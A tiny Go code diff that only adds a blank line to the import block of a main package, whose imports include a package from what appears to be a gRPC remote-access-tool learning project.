@@ -2,6 +2,7 @@ package main
 
 import (
 	"context"
+
 	"github.com/rainer37/go-fun/grpc-rat-black-hat-go/grpcapi"
 	log "github.com/sirupsen/logrus"
 	"google.golang.org/grpc"
